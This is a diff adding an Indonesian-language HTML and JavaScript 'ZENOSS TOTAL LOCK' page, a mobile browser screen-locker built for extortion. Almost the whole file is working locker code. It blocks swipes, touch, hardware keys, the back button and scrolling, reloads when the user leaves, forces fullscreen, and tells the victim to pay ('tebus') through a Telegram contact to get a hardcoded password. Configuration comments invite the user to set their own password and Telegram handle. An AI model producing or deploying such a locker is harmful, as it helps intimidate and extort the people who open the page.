@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+    <title>🔒 ZENOSS TOTAL LOCK</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent !important;
+            -webkit-touch-callout: none !important;
+            -webkit-user-select: none !important;
+            -khtml-user-select: none !important;
+            -moz-user-select: none !important;
+            -ms-user-select: none !important;
+            user-select: none !important;
+        }
+        
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden !important;
+            position: fixed !important;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: #000000;
+            font-family: 'Arial Black', sans-serif;
+            overscroll-behavior: none !important;
+            touch-action: none !important; /* KRUSIAL: MATIKAN SEMUA GESTURE */
+            -ms-touch-action: none !important;
+        }
+        
+        /* OVERLAY LOCK */
+        .lock-system {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle at center, #1a0000 0%, #000000 100%);
+            z-index: 999999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border: 4px solid #ff0000;
+            box-shadow: inset 0 0 100px #ff0000;
+        }
+        
+        /* AREA ATAS YANG DIBLOKIR TOTAL (UNTUK NOTIF & GESER) */
+        .top-blocker {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 200px; /* BLOKIR AREA GESER KE ATAS */
+            background: transparent;
+            z-index: 9999999;
+            pointer-events: auto !important;
+            touch-action: none !important;
+        }
+        
+        /* AREA BAWAH UNTUK BLOKIR GESER DARI BAWAH */
+        .bottom-blocker {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 200px;
+            background: transparent;
+            z-index: 9999999;
+            pointer-events: auto !important;
+            touch-action: none !important;
+        }
+        
+        /* AREA KIRI UNTUK BLOKIR GESER DARI SAMPING */
+        .left-blocker {
+            position: fixed;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            width: 100px;
+            background: transparent;
+            z-index: 9999999;
+            pointer-events: auto !important;
+            touch-action: none !important;
+        }
+        
+        /* AREA KANAN */
+        .right-blocker {
+            position: fixed;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            width: 100px;
+            background: transparent;
+            z-index: 9999999;
+            pointer-events: auto !important;
+            touch-action: none !important;
+        }
+        
+        .lock-container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            text-align: center;
+            position: relative;
+            z-index: 999999;
+        }
+        
+        .header h1 {
+            color: #ff0000;
+            font-size: 52px;
+            text-shadow: 0 0 30px #ff0000;
+            letter-spacing: 8px;
+            margin-bottom: 10px;
+            animation: glitch 2s infinite;
+        }
+        
+        .header h2 {
+            color: #ff3300;
+            font-size: 16px;
+            letter-spacing: 5px;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes glitch {
+            0%, 100% { text-shadow: 0 0 30px #ff0000; }
+            25% { text-shadow: -5px 0 30px #ff0000, 5px 0 30px #ff3300; }
+            50% { text-shadow: 0 0 30px #ff0000; }
+            75% { text-shadow: 5px 0 30px #ff0000, -5px 0 30px #ff3300; }
+        }
+        
+        .lock-icon {
+            width: 100px;
+            height: 100px;
+            margin: 10px auto 25px;
+            background: #ff0000;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 0 70px #ff0000;
+            animation: pulse 1.5s infinite;
+        }
+        
+        .lock-icon::before {
+            content: "🔒";
+            font-size: 50px;
+            color: #000;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 50px #ff0000; }
+            50% { transform: scale(1.1); box-shadow: 0 0 100px #ff0000; }
+            100% { transform: scale(1); box-shadow: 0 0 50px #ff0000; }
+        }
+        
+        .password-box {
+            background: rgba(0,0,0,0.9);
+            border: 3px solid #ff0000;
+            border-radius: 20px;
+            padding: 30px 20px;
+            margin: 20px 0;
+            box-shadow: 0 0 50px rgba(255,0,0,0.3);
+        }
+        
+        .password-box h3 {
+            color: #fff;
+            font-size: 14px;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            color: #ff6666;
+        }
+        
+        /* INPUT PASSWORD */
+        #passwordInput {
+            width: 100%;
+            padding: 18px;
+            font-size: 28px;
+            text-align: center;
+            background: #111;
+            border: 3px solid #ff0000;
+            color: #ff0000;
+            border-radius: 15px;
+            outline: none;
+            font-weight: bold;
+            letter-spacing: 8px;
+            caret-color: #ff0000;
+            box-shadow: 0 0 30px #ff0000;
+            pointer-events: auto !important;
+            touch-action: auto !important;
+            -webkit-user-select: auto !important;
+            user-select: auto !important;
+        }
+        
+        /* TOMBOL UNLOCK */
+        #unlockBtn {
+            width: 100%;
+            padding: 16px;
+            margin-top: 20px;
+            background: linear-gradient(45deg, #ff0000, #990000);
+            color: #000;
+            font-size: 24px;
+            font-weight: bold;
+            border: none;
+            border-radius: 15px;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+            cursor: pointer;
+            box-shadow: 0 0 40px #ff0000;
+            border: 2px solid #ff6600;
+            pointer-events: auto !important;
+            touch-action: auto !important;
+        }
+        
+        #unlockBtn:active {
+            transform: scale(0.97);
+            background: linear-gradient(45deg, #ff3300, #cc0000);
+        }
+        
+        .status {
+            color: #ff0000;
+            margin-top: 20px;
+            font-size: 16px;
+            min-height: 25px;
+            font-weight: bold;
+            text-transform: uppercase;
+            text-shadow: 0 0 10px #ff0000;
+        }
+        
+        /* TELEGRAM SECTION */
+        .telegram-section {
+            margin: 30px 0 15px;
+            padding: 20px;
+            background: rgba(20,0,0,0.9);
+            border: 2px solid #660000;
+            border-radius: 15px;
+            pointer-events: none !important;
+            touch-action: none !important;
+        }
+        
+        .telegram-contact {
+            color: #ff3333;
+            font-size: 26px;
+            font-weight: 900;
+            background: #1a0000;
+            padding: 15px 10px;
+            border-radius: 10px;
+            border: 3px solid #ff0000;
+            display: inline-block;
+            margin-top: 5px;
+            word-break: break-all;
+            text-shadow: 0 0 20px #ff0000;
+            box-shadow: 0 0 30px #ff0000;
+            pointer-events: none !important;
+        }
+        
+        .footer {
+            margin-top: 20px;
+            color: #330000;
+            font-size: 10px;
+            letter-spacing: 3px;
+        }
+        
+        /* STATUS BLOKIR */
+        .block-status {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0,0,0,0.9);
+            color: #ff0000;
+            padding: 10px 20px;
+            border: 2px solid #ff0000;
+            border-radius: 30px;
+            font-size: 14px;
+            z-index: 99999999;
+            display: none;
+            white-space: nowrap;
+            box-shadow: 0 0 30px #ff0000;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- BLOCKER UNTUK GESER KE ATAS -->
+    <div class="top-blocker" id="topBlocker"></div>
+    <div class="bottom-blocker" id="bottomBlocker"></div>
+    <div class="left-blocker" id="leftBlocker"></div>
+    <div class="right-blocker" id="rightBlocker"></div>
+    
+    <!-- STATUS POPUP -->
+    <div class="block-status" id="blockStatus">🔒 GESER KE ATAS DIBLOKIR</div>
+    
+    <!-- LOCK SYSTEM -->
+    <div class="lock-system">
+        <div class="lock-container">
+            <div class="header">
+                <h1>ZENOSS</h1>
+                <h2>TOTAL LOCK</h2>
+            </div>
+            
+            <div class="lock-icon"></div>
+            
+            <div class="password-box">
+                <h3>⚠️ TEBUS DI TELEGRAM ⚠️</h3>
+                <input type="password" id="passwordInput" placeholder="****" maxlength="6" inputmode="numeric" pattern="[0-9]*" autofocus>
+                <button id="unlockBtn">UNLOCK</button>
+                <div class="status" id="status">TERKUNCI TOTAL</div>
+            </div>
+            
+            <div class="telegram-section">
+                <div class="telegram-contact" id="telegramDisplay">@t.me/ZENOSS</div>
+                <div style="color:#550000; font-size:11px; margin-top:10px;">* HUBUNGI UNTUK TEbus PASSWORD</div>
+            </div>
+            
+            <div class="footer">
+                ☠️ GESER KE ATAS = BLOKIR 100% ☠️
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ========== KONFIGURASI ==========
+        const CONFIG = {
+            password: "0122",           // GANTI PASSWORD
+            telegram: "@t.me/zenos_bug",   // GANTI TELEGRAM
+            redirectUrl: "https://www.google.com" // GANTI URL (NANTI LANGSUNG KE HOME)
+        };
+        
+        // Terapkan konfigurasi
+        document.getElementById('telegramDisplay').innerText = CONFIG.telegram;
+        
+        // Elemen DOM
+        const passwordInput = document.getElementById('passwordInput');
+        const unlockBtn = document.getElementById('unlockBtn');
+        const statusDiv = document.getElementById('status');
+        const blockStatus = document.getElementById('blockStatus');
+        
+        // ========== BLOKIR GESER KE ATAS ==========
+        
+        // 1. Tangkap semua sentuhan di area blocker
+        const blockers = ['topBlocker', 'bottomBlocker', 'leftBlocker', 'rightBlocker'];
+        
+        blockers.forEach(id => {
+            const element = document.getElementById(id);
+            
+            // Touch events
+            element.addEventListener('touchstart', (e) => {
+                e.preventDefault();
+                e.stopPropagation();
+                
+                // Tampilkan pesan
+                showBlockMessage('🔒 GESER KE ATAS DIBLOKIR');
+                
+                return false;
+            }, { capture: true, passive: false });
+            
+            element.addEventListener('touchmove', (e) => {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, { capture: true, passive: false });
+            
+            element.addEventListener('touchend', (e) => {
+                e.preventDefault();
+                return false;
+            }, { capture: true });
+            
+            // Mouse events (untuk testing di PC)
+            element.addEventListener('mousedown', (e) => {
+                e.preventDefault();
+                showBlockMessage('🔒 AREA TERLARANG');
+                return false;
+            });
+        });
+        
+        // 2. Blokir semua gesture di seluruh layar (kecuali input)
+        document.addEventListener('touchstart', (e) => {
+            // Izinkan hanya di input dan button
+            if (!e.target.closest('#passwordInput') && !e.target.closest('#unlockBtn')) {
+                e.preventDefault();
+                e.stopPropagation();
+                
+                // Deteksi posisi sentuhan
+                const touch = e.touches[0];
+                if (touch.clientY < 150) {
+                    showBlockMessage('🔒 GESER KE ATAS DIBLOKIR');
+                } else {
+                    showBlockMessage('🔒 AREA TERLARANG');
+                }
+                
+                return false;
+            }
+        }, { capture: true, passive: false });
+        
+        document.addEventListener('touchmove', (e) => {
+            // Blokir semua gerakan
+            e.preventDefault();
+            e.stopPropagation();
+            
+            // Deteksi gerakan ke atas
+            const touch = e.touches[0];
+            if (touch.clientY < 100) {
+                showBlockMessage('🔒 GESER KE ATAS DIBLOKIR');
+            }
+            
+            return false;
+        }, { capture: true, passive: false });
+        
+        document.addEventListener('touchend', (e) => {
+            if (!e.target.closest('#passwordInput') && !e.target.closest('#unlockBtn')) {
+                e.preventDefault();
+            }
+        }, { capture: true });
+        
+        // 3. Blokir scroll dan pull-to-refresh
+        window.addEventListener('scroll', (e) => {
+            e.preventDefault();
+            window.scrollTo(0, 0);
+        }, { capture: true, passive: false });
+        
+        // 4. Fungsi tampil pesan block
+        function showBlockMessage(message) {
+            blockStatus.style.display = 'block';
+            blockStatus.innerText = message;
+            
+            setTimeout(() => {
+                blockStatus.style.display = 'none';
+            }, 1000);
+        }
+        
+        // ========== BLOKIR TOMBOL ==========
+        
+        // Blokir semua tombol fisik
+        document.addEventListener('keydown', function(e) {
+            const key = e.keyCode || e.key;
+            
+            // Daftar tombol yang diblokir
+            const blockedKeys = [3, 187, 4, 82, 24, 25, 164, 26, 27];
+            
+            if (blockedKeys.includes(keyCode) || 
+                e.key === 'Home' || e.key === 'Escape' || 
+                e.key === 'VolumeUp' || e.key === 'VolumeDown' ||
+                e.key === 'ContextMenu' || e.key === 'AppSwitch') {
+                
+                e.preventDefault();
+                e.stopPropagation();
+                
+                statusDiv.innerText = '🔒 TOMBOL DIBLOKIR';
+                setTimeout(() => {
+                    statusDiv.innerText = 'TERKUNCI TOTAL';
+                }, 1000);
+                
+                return false;
+            }
+            
+            // Izinkan hanya angka dan backspace
+            const allowedKeys = ['0','1','2','3','4','5','6','7','8','9',
+                'Backspace', 'Delete', 'Enter', 'Tab', 'ArrowLeft', 'ArrowRight'];
+            
+            if (!allowedKeys.includes(e.key) && !e.key.startsWith('Arrow')) {
+                e.preventDefault();
+                return false;
+            }
+        }, { capture: true });
+        
+        // Blokir back button
+        history.pushState(null, null, location.href);
+        window.onpopstate = function() {
+            history.pushState(null, null, location.href);
+            statusDiv.innerText = '🔒 BACK DIBLOKIR';
+            setTimeout(() => {
+                statusDiv.innerText = 'TERKUNCI TOTAL';
+            }, 1000);
+        };
+        
+        // Blokir keluar app
+        window.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                setTimeout(() => {
+                    window.location.reload();
+                }, 1);
+            }
+        });
+        
+        // ========== FUNGSI UNLOCK ==========
+        function unlock() {
+            const input = passwordInput.value;
+            
+            if (input === CONFIG.password) {
+                statusDiv.innerText = '✅ BERHASIL';
+                statusDiv.style.color = '#00ff00';
+                
+                // LANGSUNG BALIK KE HOME (URL YANG DITUJU)
+                setTimeout(() => {
+                    window.location.href = CONFIG.redirectUrl; // LANGSUNG KE HOME
+                }, 1000);
+            } else {
+                statusDiv.innerText = '❌ PASSWORD SALAH';
+                statusDiv.style.color = '#ff0000';
+                passwordInput.value = '';
+                passwordInput.focus();
+                
+                // Efek getar
+                document.querySelector('.password-box').style.animation = 'shake 0.3s';
+                setTimeout(() => {
+                    document.querySelector('.password-box').style.animation = '';
+                }, 300);
+            }
+        }
+        
+        // Animasi shake
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes shake {
+                0%, 100% { transform: translateX(0); }
+                20% { transform: translateX(-15px); }
+                40% { transform: translateX(15px); }
+                60% { transform: translateX(-8px); }
+                80% { transform: translateX(8px); }
+            }
+        `;
+        document.head.appendChild(style);
+        
+        // Event listeners
+        unlockBtn.addEventListener('click', unlock);
+        
+        passwordInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                unlock();
+            }
+        });
+        
+        // Auto focus
+        window.addEventListener('load', function() {
+            passwordInput.focus();
+        });
+        
+        // Auto reload
+        let timeout;
+        function resetTimer() {
+            clearTimeout(timeout);
+            timeout = setTimeout(() => {
+                window.location.reload();
+            }, 60000);
+        }
+        
+        passwordInput.addEventListener('keydown', resetTimer);
+        unlockBtn.addEventListener('click', resetTimer);
+        resetTimer();
+        
+        // Force fullscreen
+        if (document.documentElement.requestFullscreen) {
+            document.documentElement.requestFullscreen();
+        }
+        
+        console.log('🔒 TOTAL LOCK ACTIVE - GESER KE ATAS DIBLOKIR 100%');
+    </script>
+</body>
+</html>
